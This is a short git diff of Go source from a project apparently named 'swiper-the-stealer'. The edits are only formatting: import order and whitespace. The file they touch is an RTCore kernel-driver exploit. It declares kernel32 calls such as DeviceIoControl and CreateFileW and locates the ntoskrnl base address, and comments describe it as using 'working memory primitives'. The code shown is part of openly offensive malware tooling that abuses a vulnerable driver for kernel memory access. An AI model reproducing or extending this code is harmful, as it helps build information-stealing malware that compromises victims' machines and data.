@@ -5,8 +5,9 @@ import (
 	"syscall"
 	"unsafe"
 
-	"golang.org/x/sys/windows"
 	"swiper-the-stealer/pkg/logger"
+
+	"golang.org/x/sys/windows"
 )
 
 // Enhanced RTCore exploit with your working memory primitives (EXACT from your main.go)
@@ -19,7 +20,7 @@ type RTCoreEnhancedExploit struct {
 
 // Windows API function declarations (EXACT from your main.go)
 var (
-	modKernelEnh             = windows.NewLazySystemDLL("kernel32.dll")
+	modKernelEnh               = windows.NewLazySystemDLL("kernel32.dll")
 	procDeviceIoControlEnh     = modKernelEnh.NewProc("DeviceIoControl")
 	procCreateFileWEnh         = modKernelEnh.NewProc("CreateFileW")
 	procCloseHandleEnh         = modKernelEnh.NewProc("CloseHandle")
@@ -142,7 +143,7 @@ func (r *RTCoreEnhancedExploit) GetNtoskrnlBase() (uint64, error) {
 	if uintptr(cbNeeded) > uintptr(len(drivers))*unsafe.Sizeof(drivers[0]) {
 		return 0, fmt.Errorf("buffer too small")
 	}
-	
+
 	ntoskrnlBase := uint64(drivers[0])
 	r.logger.Infof("Ntoskrnl base address: 0x%X", ntoskrnlBase)
 	return ntoskrnlBase, nil
